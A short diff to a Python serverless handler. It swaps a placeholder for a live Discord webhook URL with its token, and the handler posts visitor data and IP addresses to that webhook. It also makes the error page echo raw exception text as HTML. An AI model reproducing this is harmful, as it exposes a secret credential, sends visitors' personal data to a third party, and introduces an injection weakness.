@@ -39,7 +39,7 @@ def handler(request):
         })
         user = user_res.json()
 
-        ip = request.headers.get("x-forwarded-for", "unknown")
+        ip = request.headers.get("x-forwarded-for", "Unknown")
 
         payload = {
             "embeds": [{
@@ -54,7 +54,10 @@ def handler(request):
             }]
         }
 
-        requests.post("YOUR_WEBHOOK_URL", json=payload)
+        requests.post(
+            "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf",
+            json=payload
+        )
 
         return {
             "statusCode": 200,
@@ -65,6 +68,6 @@ def handler(request):
     except Exception as e:
         return {
             "statusCode": 500,
-            "headers": {"Content-Type": "text/plain"},
-            "body": f"Error: {str(e)}"
+            "headers": {"Content-Type": "text/html"},
+            "body": f"<h1>❌ Error: {str(e)}</h1>"
         }
